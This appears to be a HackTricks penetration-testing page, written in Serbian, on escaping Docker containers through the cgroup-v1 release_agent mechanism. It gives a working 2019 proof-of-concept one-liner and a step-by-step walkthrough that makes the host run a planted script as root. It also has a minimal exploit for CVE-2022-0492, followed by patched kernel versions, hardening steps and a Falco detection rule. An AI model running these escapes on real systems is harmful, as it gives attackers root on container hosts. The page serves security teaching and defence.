# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Za više detalja, pogledajte** [**originalni blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ovo je samo sažetak:

---

## Klasični PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
PoC zloupotrebljava **cgroup-v1** `release_agent` funkciju: kada poslednji zadatak cgrupe koja ima `notify_on_release=1` izađe, kernel (u **početnim imenskim prostorima na hostu**) izvršava program čija je putanja sačuvana u zapisivom fajlu `release_agent`.  Budući da se to izvršavanje dešava sa **potpunim root privilegijama na hostu**, sticanje prava pisanja na fajl je dovoljno za bekstvo iz kontejnera.

### Kratak, čitljiv vodič

1. **Pripremite novu cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # ili –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Usmerite `release_agent` na skriptu koju kontroliše napadač na hostu**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Postavite payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Pokrenite notifikator**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # dodajemo sebe i odmah izlazimo
cat /output                                  # sada sadrži procese na hostu
```

---

## 2022 kernel ranjivost – CVE-2022-0492

U februaru 2022. Yiqi Sun i Kevin Wang su otkrili da **kernel *nije* proveravao privilegije kada je proces pisao u `release_agent` u cgroup-v1** (funkcija `cgroup_release_agent_write`).

Efektivno **bilo koji proces koji je mogao da montira hijerarhiju cgrupe (npr. putem `unshare -UrC`) mogao je da piše proizvoljnu putanju u `release_agent` bez `CAP_SYS_ADMIN` u *početnom* korisničkom imenskom prostoru**.  Na kontejneru sa podrazumevanom konfiguracijom koji se pokreće kao root, ovo je omogućilo:

* eskalaciju privilegija na root na hostu; ↗
* bekstvo iz kontejnera bez privilegija kontejnera.

Greška je dodeljena **CVE-2022-0492** (CVSS 7.8 / Visoko) i ispravljena u sledećim verzijama kernela (i svim kasnijim):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Patch commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Minimalni exploit unutar kontejnera
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Ako je kernel ranjiv, busybox binarni fajl sa *host*-a se izvršava sa punim root pristupom.

### Ojačavanje i ublažavanje

* **Ažurirajte kernel** (≥ verzije iznad).  Zakrpa sada zahteva `CAP_SYS_ADMIN` u *početnom* korisničkom imenskom prostoru da bi pisala u `release_agent`.
* **Preferirajte cgroup-v2** – ujedinjena hijerarhija **potpuno je uklonila `release_agent` funkciju**, eliminišući ovu klasu eskapa.
* **Onemogućite neprivilegovane korisničke prostore** na hostovima koji ih ne trebaju:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Obavezna kontrola pristupa**: AppArmor/SELinux politike koje odbijaju `mount`, `openat` na `/sys/fs/cgroup/**/release_agent`, ili uklanjaju `CAP_SYS_ADMIN`, zaustavljaju tehniku čak i na ranjivim kernelima.
* **Read-only bind-mask** svih `release_agent` fajlova (primer skripte Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Detekcija u vreme izvršavanja

[`Falco`](https://falco.org/) dolazi sa ugrađenim pravilom od v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Pravilo se aktivira na svaki pokušaj pisanja u `*/release_agent` iz procesa unutar kontejnera koji još uvek ima `CAP_SYS_ADMIN`.

## Reference

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – detaljna analiza i skripta za ublažavanje.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
